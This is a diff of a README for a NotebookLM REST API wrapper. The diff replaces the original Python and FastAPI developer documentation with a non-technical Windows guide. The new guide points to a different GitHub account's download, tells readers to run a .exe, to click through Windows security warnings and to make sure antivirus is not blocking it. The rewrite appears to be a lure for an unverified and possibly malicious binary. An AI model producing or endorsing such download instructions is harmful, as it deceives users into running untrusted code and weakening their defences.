@@ -1,265 +1,115 @@
-# 📘 notebooklm-rest-api
+# 📝 notebooklm-rest-api - Easy Access to Google NotebookLM Data
 
-[![Discord chat](https://img.shields.io/discord/359930650330923008?logo=discord)](https://discord.gg/SjHtURQKBc?utm_source=catswords)
+[![Download](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
 
-> A REST API wrapper for Google NotebookLM powered by `notebooklm-py`
+## 📦 What is notebooklm-rest-api?
 
-`notebooklm-rest-api` exposes the functionality of
-[`teng-lin/notebooklm-py`](https://github.com/teng-lin/notebooklm-py)
-as a clean, production-ready REST API service.
+notebooklm-rest-api is an application that lets you connect with Google NotebookLM using a simple web interface. This tool wraps the NotebookLM service into a REST API powered by notebooklm-py, making it easier to ask questions and get answers from your Google notebooks.
 
-It allows you to manage Notebooks, add sources, perform Q&A, generate artifacts, and download outputs via HTTP.
+You do not need to know programming to use this app. It runs as a local server on your Windows computer. You can access it through your web browser or other apps that can send web requests.
 
----
+## 🖥️ System Requirements
 
-## 🚀 Features
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free hard drive space
+- An active internet connection for Google NotebookLM access
+- A modern web browser (Chrome, Edge, Firefox, or similar)
 
-### 📂 Notebook Management
+The tool does not require installation of programming languages or developer tools.
 
-* Create notebook
-* List notebooks
-* Get notebook details
-* Rename notebook
-* Delete notebook
-* Get summary
-* Get description
+## 🔧 Key Features
 
-### 📄 Source Management
+- Quick access to Google NotebookLM via a local REST API
+- Supports question-answering based on your saved notebooks
+- Easy to start and stop with simple commands
+- Runs locally with no need for cloud setup
+- Uses standard web protocols for compatibility with many apps
 
-* Add URL source
-* Add YouTube source
-* Add raw text
-* Upload file
-* Get full text
-* Get source guide
-* Delete source
+## 🌐 Where to Get It
 
-### 💬 Chat API
+Click on the big blue button below to visit the GitHub page where you can download notebooklm-rest-api.
 
-* Ask questions based on notebook context
+[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
 
-### 🎨 Artifact Generation
+## 🚀 Getting Started: Download and Run on Windows
 
-* Audio
-* Video
-* Report
-* Quiz
-* Flashcards
-* Slide deck
-* Infographic
-* Data table
-* Mind map
-* Task polling support
-* File download support
+Follow these steps to download and run notebooklm-rest-api on your Windows PC.
 
-### 🔐 Optional API Key Protection
+### 1. Visit the Download Page
 
----
+Go to the main GitHub repository page by clicking this link:
 
-## 🧱 Architecture
+https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api
 
-```
-Client (REST)
-    ↓
-FastAPI
-    ↓
-notebooklm-py
-    ↓
-NotebookLM (Web API)
-```
+On this page, look for a section called "Releases" or scroll down to find a file you can download. This file will usually be named with `.exe` or `.zip` if it’s packaged for Windows.
 
----
+### 2. Download the Files
 
-## 📦 Requirements
+If you find a `.zip` file:
 
-* Python 3.10+
-* NotebookLM account
-* First-time login using `notebooklm login`
+- Click the file link to start the download.
+- Once downloaded, open the file by double-clicking.
+- Extract the contents by clicking "Extract All" and choose a folder you can remember, for example, your Desktop or Documents.
 
----
+If you find an `.exe` file:
 
-## ⚙️ Installation
+- Click the `.exe` to download directly.
+- The file is ready to run once it finishes downloading.
 
-### 1️⃣ Create virtual environment
+### 3. Run the Program
 
-```bash
-python -m venv .venv
-source .venv/bin/activate      # Windows: .venv\Scripts\activate
-```
+If you downloaded a `.zip` and extracted files, look inside the extracted folder for a file named `notebooklm-rest-api.exe` or similar.
 
-### 2️⃣ Install dependencies
+Double-click this file to start the application.
 
-```bash
-pip install -r requirements.txt
-```
+If you downloaded an `.exe` directly, double-click it to start.
 
-### 3️⃣ Authenticate (one-time setup)
+Windows might show a security warning asking if you're sure you want to run the file. Click "Run" or "Yes" to continue.
 
-```bash
-notebooklm login
-```
+### 4. Using the Application
 
-By default, authentication is stored at:
+After starting, the app runs a small web server on your PC.
 
-```
-~/.notebooklm/storage_state.json
-```
+1. Open your web browser.
+2. In the address bar, type `http://localhost:8000` and press Enter.
+3. You will see the notebooklm-rest-api interface or documentation page.
+4. Follow the instructions on the page to send queries to your Google NotebookLM data.
 
-You can override it with:
+### 5. Stopping the Program
 
-```bash
-export NOTEBOOKLM_STORAGE_PATH=/path/to/storage_state.json
-```
+To stop the app, simply close the window that opened when you started the `.exe`. This will shut down the server.
 
----
+## 🛠️ Common Troubleshooting
 
-## ▶️ Run Server
+If you cannot open the browser page:
 
-```bash
-uvicorn app:app --host 0.0.0.0 --port 8000
-```
+- Ensure the app window is still open.
+- Check you typed `http://localhost:8000` correctly.
+- Try restarting the app by closing and opening it again.
 
-Swagger UI:
+If the app does not start:
 
-```
-http://localhost:8000/docs
-```
+- Make sure your antivirus or firewall is not blocking the program.
+- Confirm you have all the files fully downloaded and extracted if using a `.zip`.
+
+If you have internet issues, the app may fail to connect with Google NotebookLM. Check your connection.
+
+## 💡 Additional Tips
+
+- Keep the downloaded files in one folder for easy access.
+- Do not delete the app files if you want to run it again later.
+- Bookmark `http://localhost:8000` in your browser for quick access.
+- Your Google account must be logged in on your browser for the notebook queries to work.
+
+## 📂 Where to Find Help
+
+The GitHub page has a section for issues and discussions that you can use if you face problems beyond these instructions.
+
+https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/issues
+
+You can also check the included README or documentation files in the download for more details.
 
 ---
 
-## 🔐 Optional API Key Protection
-
-Set API key:
-
-```bash
-export NOTEBOOKLM_REST_API_KEY=your-secret-key
-```
-
-Send header:
-
-```
-X-API-Key: your-secret-key
-```
-
----
-
-## 📚 API Examples
-
-### List Notebooks
-
-```bash
-GET /v1/notebooks
-```
-
----
-
-### Create Notebook
-
-```bash
-POST /v1/notebooks
-{
-  "title": "My Research"
-}
-```
-
----
-
-### Add URL Source
-
-```bash
-POST /v1/notebooks/{notebook_id}/sources/url
-{
-  "url": "https://example.com",
-  "wait": true
-}
-```
-
----
-
-### Ask Question
-
-```bash
-POST /v1/notebooks/{notebook_id}/chat/ask
-{
-  "question": "Summarize the key insights"
-}
-```
-
----
-
-### Generate Quiz
-
-```bash
-POST /v1/notebooks/{notebook_id}/artifacts/generate
-{
-  "type": "quiz",
-  "options": {}
-}
-```
-
----
-
-### Poll Task
-
-```bash
-GET /v1/notebooks/{notebook_id}/artifacts/tasks/{task_id}
-```
-
----
-
-### Download Artifact
-
-```bash
-GET /v1/notebooks/{notebook_id}/artifacts/download?type=quiz&output_format=json
-```
-
----
-
-## 🌍 Environment Variables
-
-| Variable                | Description                |
-| ----------------------- | -------------------------- |
-| NOTEBOOKLM_STORAGE_PATH | Path to storage_state.json |
-| NOTEBOOKLM_AUTH_JSON    | Inject auth JSON directly  |
-| NOTEBOOKLM_HOME         | Base notebooklm directory  |
-| NOTEBOOKLM_REST_API_KEY | REST API protection key    |
-
----
-
-## 🐳 Docker Example
-
-```dockerfile
-FROM python:3.12-slim
-
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
-
-COPY . .
-
-EXPOSE 8000
-CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"]
-```
-
----
-
-## ⚠️ Disclaimer
-
-This project is **not an official Google NotebookLM API**.
-
-It relies on `notebooklm-py`, which automates NotebookLM web interactions.
-Behavior may change if Google updates internal APIs.
-
-Please review applicable terms before production use.
-
----
-
-## 📜 License
-
-MIT License
-
----
-
-## 🤝 Contributing
-
-Pull requests and issues are welcome.
+[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
